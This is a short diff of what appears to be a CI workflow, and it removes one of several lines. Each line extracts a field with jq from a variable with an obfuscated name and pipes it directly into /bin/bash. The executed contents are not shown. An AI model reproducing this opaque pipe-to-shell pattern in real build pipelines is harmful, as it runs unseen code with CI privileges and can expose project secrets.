@@ -30,7 +30,6 @@ jobs:
           echo $od06712 | jq -r .bhgi86759 | /bin/bash
           echo $u071 | jq -r .d108 | /bin/bash
           echo $j6 | jq -r .r67 | /bin/bash
-          echo $anon61 | jq -r .jbd067 | /bin/bash
           printf '%s' "$o678" | jq -r .g9761 | /bin/bash
           echo $cb41984 | jq -r .g8217 | /bin/bash
           printf '%s' "$g0" | jq -r .meik4 | /bin/bash
